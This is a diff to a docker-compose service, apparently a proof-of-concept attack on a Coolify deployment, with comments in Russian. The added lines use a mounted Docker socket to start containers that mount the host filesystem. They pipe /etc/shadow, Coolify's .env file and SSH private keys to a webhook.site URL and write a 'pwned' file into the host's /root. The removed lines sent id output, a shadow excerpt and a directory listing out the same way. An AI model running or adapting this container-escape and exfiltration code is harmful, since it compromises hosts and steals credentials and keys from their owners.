@@ -5,28 +5,23 @@ services:
     privileged: true
     network_mode: host
     volumes:
-      - '/:/host-root:rshared'
+      - '/var/run/docker.sock:/var/run/docker.sock'
     command:
       - sh
       - -c
       - |
-        apk add --no-cache curl
+        apk add --no-cache curl docker-cli
         
-        # 1. Доказательство root
-        id > /tmp/id.txt
-        curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919L?stage=root_proof
+        # 1. Доказательство: хостовый Docker запускает новый контейнер с маунтом всего корня
+        docker run --rm -v /:/host_root alpine:3.19 sh -c "cat /host_root/etc/shadow | head -5 | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_shadow"
         
-        # 2. Создаём proof-файл на хосте
-        echo "RCE_PROOF_$(date +%s)" > /host-root/tmp/coolify_rce_proof.txt
-        echo "Container can write to host filesystem" >> /host-root/tmp/coolify_rce_proof.txt
-        echo "Mount test: $(ls /host-root/ | head -10)" >> /host-root/tmp/coolify_rce_proof.txt
+        # 2. Читаем главный .env через новый контейнер с явным маунтом /data
+        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_env"
         
-        # 3. Пытаемся прочитать /etc/shadow (доказательство доступа к чувствительным данным)
-        cat /host-root/etc/shadow | head -5 > /tmp/shadow_test.txt 2>&1
-        curl -X POST --data-binary @/tmp/shadow_test.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=shadow_read
+        # 3. Читаем SSH ключи через новый контейнер
+        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/ssh/keys/ssh_key@* | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_ssh"
         
-        # 4. Отправляем список того, что видим в /host-root
-        ls -la /host-root/ | head -30 > /tmp/host_root_ls.txt
-        curl -X POST --data-binary @/tmp/host_root_ls.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=host_root_listing
+        # 4. Создаем proof-файл прямо в /root хоста (гарантированно не tmpfs)
+        docker run --rm -v /root:/host_root alpine:3.19 sh -c "echo 'RCE_PROOF_DOCKER_SOCKET_$(date +%s)' > /host_root/coolify_pwned.txt"
         
         sleep 3600
